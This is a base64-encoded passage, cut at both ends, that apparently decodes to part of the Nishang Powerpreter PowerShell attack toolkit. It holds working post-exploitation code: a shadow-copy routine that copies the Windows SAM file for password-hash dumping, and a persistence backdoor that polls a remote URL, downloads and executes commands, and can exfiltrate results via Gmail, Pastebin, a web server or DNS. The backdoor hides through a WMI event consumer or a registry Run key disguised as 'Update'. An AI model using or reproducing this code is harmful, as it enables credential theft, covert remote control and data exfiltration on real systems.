ZpY2UgKHN0YXJ0cyBpdCBpZiBub3QgcnVubmluZyksIGNyZWF0ZXMgYSBzaGFkb3cgb2YgQzogCmFuZCBjb3BpZXMgIHRoZSBTQU0gZmlsZSB3aGljaCBjb3VsZCBiZSB1c2VkIHRvIGR1bXAgcGFzc3dvcmQgaGFzaGVzIGZyb20gaXQuIFRoaXMgbXVzdCBiZSBydW4gZnJvbSBhbiBlbGV2YXRlZCBzaGVsbC4KCi5QQVJBTUVURVIgUEFUSApUaGUgcGF0aCB3aGVyZSBTQU0gZmlsZSB3b3VsZCBiZSBzYXZlZC4gVGhlIGZvbGRlciBtdXN0IGV4aXN0IGFscmVhZHkuCgouRVhBTVBMRQpQUyA+IENvcHktVlNTClNhdmVzIHRoZSBTQU0gZmlsZSBpbiBjdXJyZW50IHJ1biBsb2NhdGlvbiBvZiB0aGUgcGF5bG9hZC4KCi5FeGFtcGxlClBTID4gQ29weS1WU1MgLXBhdGggQzpcdGVtcAoKLkxJTksKaHR0cDovL3d3dy5jYW5oYXpjb2RlLmNvbS9pbmRleC5waHA/YT00Cmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCgouTk9URVMKQ29kZSBieSBAYWwxNHMKCiM+CgoKZnVuY3Rpb24gQ29weS1WU1MKewogICAgW0NtZGxldEJpbmRpbmcoKV0gUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUGF0aAogICAgKQogICAgJHNlcnZpY2UgPSAoR2V0LVNlcnZpY2UgLW5hbWUgVlNTKQogICAgaWYoJHNlcnZpY2UuU3RhdHVzIC1uZSAiUnVubmluZyIpCiAgICB7CiAgICAgICAgJG5vdHJ1bm5pbmc9MQogICAgICAgICRzZXJ2aWNlLlN0YXJ0KCkKICAgIH0KICAgICRpZCA9IChnd21pIC1saXN0IHdpbjMyX3NoYWRvd2NvcHkpLkNyZWF0ZSgiQzpcIiwiQ2xpZW50QWNjZXNzaWJsZSIpLlNoYWRvd0lECiAgICAkdm9sdW1lID0gKGd3bWkgd2luMzJfc2hhZG93Y29weSAtZmlsdGVyICJJRD0nJGlkJyIpCiAgICAkZmlsZXBhdGggPSAiJHB3ZFxTQU0iCiAgICBpZiAoJHBhdGgpCiAgICB7CiAgICAgICAgJGZpbGVwYXRoID0gIiRwYXRoXFNBTSIKICAgIH0KCiAgICBgY21kIC9jIGNvcHkgIiQoJHZvbHVtZS5EZXZpY2VPYmplY3QpXHdpbmRvd3Ncc3lzdGVtMzJcY29uZmlnXFNBTSIgJGZpbGVwYXRoYCAKICAgICR2b2x1bWUuRGVsZXRlKCkKICAgIGlmKCRub3RydW5uaW5nIC1lcSAxKQogICAgewogICAgICAgICRzZXJ2aWNlLlN0b3AoKQogICAgfSAKfQoKCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI0FjaGlldmUgcGVyc2lzdGVuY2UgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyMjaHR0cDovL2Jsb2dzLnRlY2huZXQuY29tL2IvaGV5c2NyaXB0aW5nZ3V5L2FyY2hpdmUvMjAxMi8wNy8yMC91c2UtcG93ZXJzaGVsbC10by1jcmVhdGUtYS1wZXJtYW5lbnQtd21pLWV2ZW50LXRvLWxhdW5jaC1hLXZic2NyaXB0LmFzcHgKCmZ1bmN0aW9uIFBlcnNpc3RlbmNlCnsKPCMKLlNZTk9QU0lTCkZ1bmN0aW9uIHdoaWNoIGNvdWxkIGJlIHVzZWQgdG8gYWRkIHJlYm9vdCBwZXJzaXN0ZW5jZSB0byBwb3dlcnByZXRlci4KCi5ERVNDUklQVElPTgpQb3dlcnByZXRlciBpcyBkcm9wcGVkIGludG8gdGhlIHVzZXIncyB0ZW1wIGRpcmVjdG9yeSAod2l0aCBuYW1lIFVwZGF0ZS5wc20xKSBhbmQgZWl0aGVyIFdNSSBwZXJtYW5lbnQgZXZlbnQgY29uc3VtZXIgb3IgUmVnaXN0cnkgY2hhbmdlcyBpcyB1c2VkIChiYXNlZCBvbiBwcml2cykgZm9yIHBlcnNpc3RlbmNlLgpUaGUgVXBkYXRlLnBzbTEgaXMgdGhlbiBjb3BpZWQgdG8gJFBTTW9kdWxlcGF0aCBvZiB0aGUgdXNlci4KUGVyc2lzdGVuY2UgY3JlYXRlZCB1c2luZyB0aGlzIGZ1bmN0aW9uIGNvdWxkIGJlIGNsZWFuZWQgYnkgdXNpbmcgdGhlIFJlbW92ZS1QZXJzaXN0ZW5jZSBmdW5jdGlvbi4KCi5QQVJBTUVURVIgQ2hlY2tVUkwKVGhlIFVSTCB3aGljaCB0aGUgcGF5bG9hZCB3b3VsZCBxdWVyeSBmb3IgaW5zdHJ1Y3Rpb25zLgoKLlBBUkFNRVRFUiBQYXlsb2FkVVJMClRoZSBVUkwgZnJvbSB3aGVyZSBjb21tYW5kcyBjb3VsZCBiZSBzZW50LiBGdW5jdGlvbiBuYW1lcyBvZiBQb3dlcnByZXRlciBjb3VsZCBiZSB1c2VkIGhlcmUuCklmIHRoZSB0YXJnZXQgaGFzIHBvd2Vyc2hlbGwgdjIgKG9yIHlvdSBhcmUgbm90IHN1cmUpLCB1c2UgSW1wb3J0LU1vZHVsZSBVcGRhdGUgaW4gdGhlIGNvbW1hbmQuCkZvciBleGFtcGxlOiAgIEltcG9ydC1Nb2R1bGUgVXBkYXRlOyBHZXQtV2xhbi1LZXlzCgoKLlBBUkFNRVRFUiBQb3dlcnByZXRlclVSTApUaGUgVVJMIGZyb20gd2hlcmUgcG93ZXJwcmV0ZXIgd291bGQgYmUgZG93bmxvYWRlZCBpZiBpdCBpcyByZW1vdmVkIGZyb20gdGhlIHVzZXIncyB0ZW1wIGRpcmVjdG9yeS4KCi5QQVJBTUVURVIgTWFnaWNTdHJpbmcKVGhlIHN0cmluZyB3aGljaCB3b3VsZCBhY3QgYXMgYW4gaW5zdHJ1Y3Rpb24gdG8gdGhlIHBheWxvYWQgdG8gcHJvY2VlZCB3aXRoIGRvd25sb2FkIGFuZCBleGVjdXRlLgoKLlBBUkFNRVRFUiBTdG9wU3RyaW5nClRoZSBzdHJpbmcgd2hpY2ggaWYgZm91bmQgYXQgQ2hlY2tVUkwgd2lsbCBzdG9wIHRoZSBwYXlsb2FkLgoKLlBBUkFNRVRFUiBwZXJzaXN0ClVzZSB0aGlzIHBhcmFtZXRlciB0byBhY2hpZXZlIHJlYm9vdCBwZXJzaXN0ZW5jZS4gRGlmZmVyZW50IG1ldGhvZHMgb2YgcGVyc2lzdGVuY2Ugd2l0aCBBZG1pbiBhY2Nlc3MgYW5kIG5vcm1hbCB1c2VyIGFjY2Vzcy4KCi5QQVJBTUVURVIgZXhmaWwKVXNlIHRoaXMgcGFyYW1ldGVyIHRvIHVzZSBleGZpbHRyYXRpb24gbWV0aG9kcyBmb3IgcmV0dXJuaW5nIHRoZSByZXN1bHRzLgoKLlBBUkFNRVRFUiBFeGZpbE9wdGlvbgpUaGUgbWV0aG9kIHlvdSB3YW50IHRvIHVzZSBmb3IgZXhmaXRyYXRpb24gb2YgZGF0YS4gVmFsaWQgb3B0aW9ucyBhcmUgImdtYWlsIiwicGFzdGViaW4iLCJXZWJTZXJ2ZXIiIGFuZCAiRE5TIi4KCi5QQVJBTUVURVIgZGV2X2tleQpUaGUgVW5pcXVlIEFQSSBrZXkgcHJvdmlkZWQgYnkgcGFzdGViaW4gd2hlbiB5b3UgcmVnaXN0ZXIgYSBmcmVlIGFjY291bnQuClVudXNlZCBmb3Igb3RoZXIgb3B0aW9ucwoKLlBBUkFNRVRFUiB1c2VybmFtZQpVc2VybmFtZSBmb3IgdGhlIHBhc3RlYmluL2dtYWlsIGFjY291bnQgd2hlcmUgZGF0YSB3b3VsZCBiZSBleGZpbHRyYXRlZC4KVW51c2VkIGZvciBvdGhlciBvcHRpb25zCgouUEFSQU1FVEVSIHBhc3N3b3JkClBhc3N3b3JkIGZvciB0aGUgcGFzdGViaW4vZ21haWwgYWNjb3VudCB3aGVyZSBkYXRhIHdvdWxkIGJlIGV4ZmlsdHJhdGVkLgpVbnVzZWQgZm9yIG90aGVyIG9wdGlvbnMKCi5QQVJBTUVURVIgVVJMClRoZSBVUkwgb2YgdGhlIHdlYnNlcnZlciB3aGVyZSBQT1NUIHJlcXVlc3RzIHdvdWxkIGJlIHNlbnQuCgouUEFSQU1FVEVSIERvbWFpbk5hbWUKVGhlIERvbWFpbk5hbWUsIHdob3NlIHN1YmRvbWFpbnMgd291bGQgYmUgdXNlZCBmb3Igc2VuZGluZyBUWFQgcXVlcmllcyB0by4KCi5QQVJBTUVURVIgQXV0aE5TCkF1dGhvcml0YXRpdmUgTmFtZSBTZXJ2ZXIgZm9yIHRoZSBkb21haW4gc3BlY2lmaWVkIGluIERvbWFpbk5hbWUKCi5FeGFtcGxlClBTID4gUGVyc2lzdGVuY2UKVGhlIHBheWxvYWQgd2lsbCBhc2sgZm9yIGFsbCByZXF1aXJlZCBvcHRpb25zLgoKLkV4YW1wbGUKUFMgPiBQZXJzaXN0ZW5jZSBodHRwOi8vcGFzdGViaW4uY29tL3Jhdy5waHA/aT1qcVAydkozeCBodHRwOi8vcGFzdGViaW4uY29tL3Jhdy5waHA/aT1aaHlmOHJ3aCBzdGFydCBzdG9wdGhpcyAtZXhmaWwgLUV4ZmlsT3B0aW9uIEROUyAtRG9tYWluTmFtZSBleGFtcGxlLmNvbSAtQXV0aE5TIDguOC44LjgKVXNlIGFib3ZlIGNvbW1hbmQgZm9yIHVzaW5nIGV4ZmlsdHJhdGlvbiBtZXRob2RzLgoKCi5MSU5LCmh0dHA6Ly9sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCmh0dHA6Ly9ibG9ncy50ZWNobmV0LmNvbS9iL2hleXNjcmlwdGluZ2d1eS9hcmNoaXZlLzIwMTIvMDcvMjAvdXNlLXBvd2Vyc2hlbGwtdG8tY3JlYXRlLWEtcGVybWFuZW50LXdtaS1ldmVudC10by1sYXVuY2gtYS12YnNjcmlwdC5hc3B4CiM+CgogICAgCltDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lPSJub2V4ZmlsIildIFBhcmFtKAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkZXhmaWwsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyc2V0bmFtZT0iZXhmaWwiKV0KICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlcnNldG5hbWU9Im5vZXhmaWwiKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDaGVja1VSTCwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXQogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyc2V0bmFtZT0ibm9leGZpbCIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBheWxvYWRVUkwsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyc2V0bmFtZT0iZXhmaWwiKV0KICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlcnNldG5hbWU9Im5vZXhmaWwiKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQb3dlcnByZXRlclVSTCwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXQogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyc2V0bmFtZT0ibm9leGZpbCIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE1hZ2ljU3RyaW5nLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJFRydWUsIFBhcmFtZXRlcnNldG5hbWU9ImV4ZmlsIildCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJzZXRuYW1lPSJub2V4ZmlsIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU3RvcFN0cmluZywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNSwgTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXSBbVmFsaWRhdGVTZXQoImdtYWlsIiwicGFzdGViaW4iLCJXZWJTZXJ2ZXIiLCJETlMiKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRFeGZpbE9wdGlvbiwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDYsIE1hbmRhdG9yeSA9ICRGYWxzZSwgUGFyYW1ldGVyc2V0bmFtZT0iZXhmaWwiKV0gCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkZGV2X2tleSA9ICJudWxsIiwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDcsIE1hbmRhdG9yeSA9ICRGYWxzZSwgUGFyYW1ldGVyc2V0bmFtZT0iZXhmaWwiKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICR1c2VybmFtZSA9ICJudWxsIiwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDgsIE1hbmRhdG9yeSA9ICRGYWxzZSwgUGFyYW1ldGVyc2V0bmFtZT0iZXhmaWwiKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRwYXNzd29yZCA9ICJudWxsIiwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDksIE1hbmRhdG9yeSA9ICRGYWxzZSwgUGFyYW1ldGVyc2V0bmFtZT0iZXhmaWwiKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRVUkwgPSAibnVsbCIsCiAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxMCwgTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbk5hbWUgPSAibnVsbCIsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxMSwgTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJzZXRuYW1lPSJleGZpbCIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEF1dGhOUyA9ICJudWxsIiAgIAogICAKICAgKQoKICAgICRiYWNrZG9vcmNvZGUgPSBAJyAKZnVuY3Rpb24gUGVyc2lzdGVuY2VfSFRUUCAoJENoZWNrVVJMLCAkUGF5bG9hZFVSTCwgJE1hZ2ljU3RyaW5nLCAkU3RvcFN0cmluZywgJEV4ZmlsT3B0aW9uLCAkZGV2X2tleSwgJHVzZXJuYW1lLCAkcGFzc3dvcmQsICRVUkwsICREb21haW5OYW1lLCAkQXV0aE5TLCAkZXhmaWwpIAp7CiAgICB3aGlsZSgkdHJ1ZSkKICAgIHsKICAgICRleGVjID0gMAogICAgc3RhcnQtc2xlZXAgLXNlY29uZHMgNQogICAgJHdlYmNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKICAgICRmaWxlY29udGVudCA9ICR3ZWJjbGllbnQuRG93bmxvYWRTdHJpbmcoIiRDaGVja1VSTCIpCiAgICBpZigkZmlsZWNvbnRlbnQgLWVxICRNYWdpY1N0cmluZykKICAgIHsKICAgICAgICAkcGFzdGV2YWx1ZSA9IEludm9rZS1FeHByZXNzaW9uICR3ZWJjbGllbnQuRG93bmxvYWRTdHJpbmcoJFBheWxvYWRVUkwpCiAgICAgICAgJGV4ZWMrKwogICAgICAgIGlmICgkZXhmaWwgLWVxICRUcnVlKQogICAgICAgIHsKICAgICAgICAgICBEby1FeGZpbHRyYXRpb24gIiRwYXN0ZXZhbHVlIiAiJEV4ZmlsT3B0aW9uIiAiJGRldl9rZXkiICIkdXNlcm5hbWUiICIkcGFzc3dvcmQiICIkVVJMIiAiJERvbWFpbk5hbWUiICIkQXV0aE5TIgogICAgICAgIH0KICAgICAgICBpZiAoJGV4ZWMgLWVxIDEpCiAgICAgICAgewogICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA2MAogICAgICAgIH0KICAgIH0KICAgIGVsc2VpZiAoJGZpbGVjb250ZW50IC1lcSAkU3RvcFN0cmluZykKICAgIHsKICAgICAgICBicmVhawogICAgfQogICAgfQp9CidACiAgICAkcG93ZXJwcmV0ZXJwYXRoID0gICRNeUludm9jYXRpb24uTXlDb21tYW5kLk1vZHVsZS5QYXRoCiAgICBDb3B5LUl0ZW0gJHBvd2VycHJldGVycGF0aCAtRGVzdGluYXRpb24gJGVudjpURU1QXFVwZGF0ZS5wc20xCiAgICBlY2hvICJTZXQgb2JqU2hlbGwgPSBDcmVhdGVPYmplY3QoYCJXc2NyaXB0LnNoZWxsYCIpIiA+ICIkZW52OnRlbXBcdXBkYXRlLnZicyIKICAgIGVjaG8gIm9ialNoZWxsLnJ1bihgInBvd2Vyc2hlbGwgLVdpbmRvd1N0eWxlIEhpZGRlbiAtZXhlY3V0aW9ucG9saWN5IGJ5cGFzcyAtZmlsZSAkZW52OnRlbXBcdXBkYXRlLnBzMWAiKSIgPj4gIiRlbnY6dGVtcFx1cGRhdGUudmJzIgogICAgZWNobyAiaWYgKCEoVGVzdC1QYXRoICRlbnY6VEVNUFxVcGRhdGUucHNtMSkpIHsoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoYCIkUG93ZXJwcmV0ZXJVUkxgIixgIiRlbnY6dGVtcFxVcGRhdGUucHNtMWAiKX0iID4+ICIkZW52OnRlbXBcdXBkYXRlLnBzMSIKICAgIGVjaG8gIm1rZGlyIGAiJGhvbWVcRG9jdW1lbnRzXFdpbmRvd3NQb3dlclNoZWxsXE1vZHVsZXNcVXBkYXRlKHg2NClgIiwgYCIkaG9tZVxEb2N1bWVudHNcV2luZG93c1Bvd2VyU2hlbGxcTW9kdWxlc1xVcGRhdGVgIiwgYCIkaG9tZVxEb2N1bWVudHNcV2luZG93c1Bvd2VyU2hlbGxcTW9kdWxlc1xVcGRhdGVDaGVja2AiIiA+ICIkZW52OnRlbXBcdXBkYXRlLnBzMSIKICAgIGVjaG8gImAkY3VycmVudHBhdGggPSBgIiRlbnY6dGVtcFxVcGRhdGUucHNtMWAiIiA+PiAiJGVudjp0ZW1wXHVwZGF0ZS5wczEiCiAgICBlY2hvICJDb3B5LUl0ZW0gYCRjdXJyZW50cGF0aCAtRGVzdGluYXRpb24gYCIkaG9tZVxEb2N1bWVudHNcV2luZG93c1Bvd2VyU2hlbGxcTW9kdWxlc1xVcGRhdGVgIiIgPj4gIiRlbnY6dGVtcFx1cGRhdGUucHMxIgogICAgT3V0LUZpbGUgLUlucHV0T2JqZWN0ICRiYWNrZG9vcmNvZGUgLUFwcGVuZCAiJGVudjpURU1QXHVwZGF0ZS5wczEiCiAgICAkY3VycmVudFByaW5jaXBhbCA9IE5ldy1PYmplY3QgU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NQcmluY2lwYWwoIFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKSAKICAgIGlmKCRjdXJyZW50UHJpbmNpcGFsLklzSW5Sb2xlKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikgLWVxICR0cnVlKQogICAgewogICAgICAgICRmaWx0ZXJOUyA9ICJyb290XGNpbXYyIgogICAgICAgICR3bWlOUyA9ICJyb290XHN1YnNjcmlwdGlvbiIKICAgICAgICAkcXVlcnkgPSBAIgogICAgICAgICBTZWxlY3QgKiBmcm9tIF9fSW5zdGFuY2VDcmVhdGlvbkV2ZW50IHdpdGhpbiAzIAogICAgICAgICB3aGVyZSB0YXJnZXRJbnN0YW5jZSBpc2EgJ1dpbjMyX0xvZ29uU2Vzc2lvbicgCiJACiAgICAgICAgJGZpbHRlck5hbWUgPSAiV2luZG93c1Nhbml0eSIKICAgICAgICAkc2NyaXB0cGF0aCA9ICRlbnY6VEVNUAogICAgICAgICRzY3JpcHRGaWxlTmFtZSA9ICIkc2NyaXB0cGF0aFx1cGRhdGUudmJzIgogICAgICAgICRmaWx0ZXJQYXRoID0gU2V0LVdtaUluc3RhbmNlIC1DbGFzcyBfX0V2ZW50RmlsdGVyIC1OYW1lc3BhY2UgJHdtaU5TIC1Bcmd1bWVudHMgQHtuYW1lPSRmaWx0ZXJOYW1lOyBFdmVudE5hbWVTcGFjZT0kZmlsdGVyTlM7IFF1ZXJ5TGFuZ3VhZ2U9IldRTCI7IFF1ZXJ5PSRxdWVyeX0KICAgICAgICAkY29uc3VtZXJQYXRoID0gU2V0LVdtaUluc3RhbmNlIC1DbGFzcyBBY3RpdmVTY3JpcHRFdmVudENvbnN1bWVyIC1OYW1lc3BhY2UgJHdtaU5TIC1Bcmd1bWVudHMgQHtuYW1lPSJXaW5kb3dzU2FuaXR5IjsgU2NyaXB0RmlsZU5hbWU9JHNjcmlwdEZpbGVOYW1lOyBTY3JpcHRpbmdFbmdpbmU9IlZCU2NyaXB0In0KICAgICAgICBTZXQtV21pSW5zdGFuY2UgLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgLU5hbWVzcGFjZSAkd21pTlMgLWFyZ3VtZW50cyBAe0ZpbHRlcj0kZmlsdGVyUGF0aDsgQ29uc3VtZXI9JGNvbnN1bWVyUGF0aH0gfCAgb3V0LW51bGwKICAgICAgICAkb3B0aW9ucyA9ICJQZXJzaXN0ZW5jZV9IVFRQICAkQ2hlY2tVUkwgJFBheWxvYWRVUkwgJE1hZ2ljU3RyaW5nICRTdG9wU3RyaW5nIgogICAgICAgIGlmICgkZXhmaWwgLWVxICRUcnVlKQogICAgICAgIHsKICAgICAgICAgICAgJG9wdGlvbnMgPSAiUGVyc2lzdGVuY2VfSFRUUCAkQ2hlY2tVUkwgJFBheWxvYWRVUkwgJE1hZ2ljU3RyaW5nICRTdG9wU3RyaW5nICRFeGZpbE9wdGlvbiAkZGV2X2tleSAkdXNlcm5hbWUgJHBhc3N3b3JkICRVUkwgJERvbWFpbk5hbWUgJEF1dGhOUyAkZXhmaWwiCiAgICAgICAgfQogICAgICAgIE91dC1GaWxlIC1JbnB1dE9iamVjdCAkb3B0aW9ucyAtQXBwZW5kICIkZW52OlRFTVBcdXBkYXRlLnBzMSIKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBOZXctSXRlbVByb3BlcnR5IC1QYXRoIEhLQ1U6U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXCAtTmFtZSBVcGRhdGUgLVByb3BlcnR5VHlwZSBTdHJpbmcgLVZhbHVlICIkKCRlbnY6dGVtcClcdXBkYXRlLnZicyIgLWZvcmNlCiAgICAgICAgJG9wdGlvbnMgPSAiUGVyc2lzdGVuY2VfSFRUUCAgJENoZWNrVVJMICRQYXlsb2FkVVJMICRNYWdpY1N0cmluZyAkU3RvcFN0cmluZyIKICAgICAgICBpZiAoJGV4ZmlsIC1lcSAkVHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgICRvcHRpb25zID0gIlBlcnNpc3RlbmNlX0hUVFAgJENoZWNrVVJMICRQYXlsb2FkVVJMICRNYWdpY1N0cmluZyAkU3RvcFN0cmluZyAkRXhmaWxPcHRpb24gJGRldl9rZXkgJHVzZXJuYW1lICRwYXNzd29yZCAkVVJMICREb21haW5OYW1lICRBdXRoTlMgJGV4ZmlsIgogICAgICAgIH0KICAgICAgICBPdXQtRmlsZSAtSW5wdXRPYmplY3QgJG9wdGlvbnMgLUFwcGVuZCAiJGVudjpURU1QXHVwZGF0ZS5wczEiCiAgICB9CiAgICAKICAgIEludm9rZS1FeHByZXNzaW9uICIkZW52OlRFTVBcdXBkYXRlLnZicyIKfQoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgQ2xlYXIgUGVyc2lzdGVuY2UgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKZnVuY3Rpb24gUmVtb3ZlLVBlcnNpc3RlbmNlCnsKIDwjCi5TWU5PUFNJUwpGdW5jdGlvbiB3aGljaCBjb3VsZCBiZSB1c2VkIHRvIGNsZWFyIHRoZSBwZXJzaXN0ZW5jZSBhZGRlZCBieSBiYWNrZG9vcnMgYW5kIGtleWxvZ2dlci4KCi5ERVNDUklQVElPTgpUaGlzIGZ1bmN0aW9uIGNsZWFucyBXTUkgZXZlbnRzIGFuZCBSZWdpc3RyeSBrZXlzIGFkZGVkIGJ5IHZhcmlvdXMgcGF5bG9hZHMgYW5kIEFkZC1wZXJzaXN0ZW5jZSBzY3JpcHQgb2YgTmlzaGFuZy4KUnVuIHRoZSBmdW5jdGlvbiBhcyBhbiBBZG1pbmlzdHJhdG9yIHRvIHJlbW92ZSB0aGUgV01JIGV2ZW50cy4KCi5FeGFtcGxlClBTID4gUmVtb3ZlLVBlcnNpc3RlbmNlCgouTElOSwpodHRwOi8vbGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuY29tLwpodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwpodHRwOi8vYmxvZ3MudGVjaG5ldC5jb20vYi9oZXlzY3JpcHRpbmdndXkvYXJjaGl2ZS8yMDEyLzA3LzIwL3VzZS1wb3dlcnNoZWxsLXRvLWNyZWF0ZS1hLXBlcm1hbmVudC13bWktZXZlbnQtdG8tbGF1bmNoLWEtdmJzY3JpcHQuYXNweAojPgogICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZT0ibm9leGZpbCIpXSBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCldIFtTd2l0Y2hdCiAgICAgICAgJFJlbW92ZQogICAgKQoKICAgIGlmICgkUmVtb3ZlIC1lcSAkdHJ1ZSkKICAgIHsKICAgICAgICAkY3VycmVudFByaW5jaXBhbCA9IE5ldy1PYmplY3QgU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NQcmluY2lwYWwoIFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKQogICAgICAgIGlmKCRjdXJyZW50UHJpbmNpcGFsLklzSW5Sb2xlKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikgLW5lICR0cnVlKQogICAgICAgIHsgICAgCiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlJ1biB0aGUgQ29tbWFuZCBhcyBhbiBBZG1pbmlzdHJhdG9yLiBSZW1vdmluZyBSZWdpc3RyeSBrZXlzIG9ubHkuIgogICAgICAgICAgICBSZW1vdmUtSXRlbVByb3BlcnR5IC1QYXRoIEhLQ1U6U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXCAtTmFtZSBVcGRhdGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgQnJlYWsKICAgICAgICB9CgogICAgICAgIFdyaXRlLU91dHB1dCAiUmVtb3ZpbmcgdGhlIFdNSSBFdmVudHMuIgogICAgICAgICRmaWx0ZXJOYW1lID0gIldpbmRvd3NTYW5pdHkiCiAgICAgICAgZ3dtaSBfX2V2ZW50RmlsdGVyIC1uYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLWZpbHRlciAibmFtZT0nV2luZG93c1Nhbml0eScifCBSZW1vdmUtV21pT2JqZWN0CiAgICAgICAgZ3dtaSBhY3RpdmVTY3JpcHRFdmVudENvbnN1bWVyIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gfCBSZW1vdmUtV21pT2JqZWN0CiAgICAgICAgZ3dtaSBfX2ZpbHRlcnRvY29uc3VtZXJiaW5kaW5nIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUZpbHRlciAiRmlsdGVyID0gIiJfX2V2ZW50ZmlsdGVyLm5hbWU9J1dpbmRvd3NTYW5pdHknIiIiICB8IFJlbW92